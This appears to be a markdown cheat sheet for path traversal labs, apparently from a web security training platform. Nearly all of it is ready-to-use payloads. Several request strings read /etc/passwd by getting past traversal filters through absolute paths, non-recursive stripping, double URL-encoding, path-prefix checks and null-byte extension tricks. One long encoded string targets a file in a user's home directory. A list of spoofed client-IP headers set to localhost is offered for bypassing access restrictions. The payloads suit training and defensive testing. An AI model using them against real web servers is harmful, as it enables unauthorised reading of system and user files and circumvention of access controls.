## Use Burp Intruder and its worlist:

![sd](https://github.com/user-attachments/assets/deb9b141-a5d1-45f9-ae02-1a572947ca1b)

## File path traversal, traversal sequences blocked with absolute path bypass

```
/image?filename=/etc/passwd
```

## File path traversal, traversal sequences stripped non-recursively

```
/image?filename=..././..././..././etc/passwd
```

## File path traversal, traversal sequences stripped with superfluous URL-decode

```
%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd
```

## File path traversal, validation of start of path

```
/image?filename=/var/www/images/../../../../etc/passwd
```

## File path traversal, validation of file extension with null byte bypass

```
../../../../../../etc/passwd%00.jpg
```

## Encoded

```
/image?filename=%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%38%25%36%66%25%36%64%25%36%35%25%32%66%25%36%33%25%36%31%25%37%32%25%36%63%25%36%66%25%37%33%25%32%66%25%37%33%25%36%35%25%36%33%25%37%32%25%36%35%25%37%34
```

## Use my program for path traversal bruteforce

## Path Traversal Bypasses

    Adding Headers in request with value 127.0.0.1 or localhost can also help in bypassing restrictions.

```
X-Custom-IP-Authorization: 127.0.0.1
X-Forwarded-For: localhost
X-Forward-For: localhost
X-Remote-IP: localhost
X-Client-IP: localhost
X-Real-IP: localhost
```
```
X-Originating-IP: 127.0.0.1
X-Forwarded: 127.0.0.1
Forwarded-For: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-ProxyUser-Ip: 127.0.0.1
X-Original-URL: 127.0.0.1
Client-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
Cluster-Client-IP: 127.0.0.1
X-ProxyUser-Ip: 127.0.0.1
```
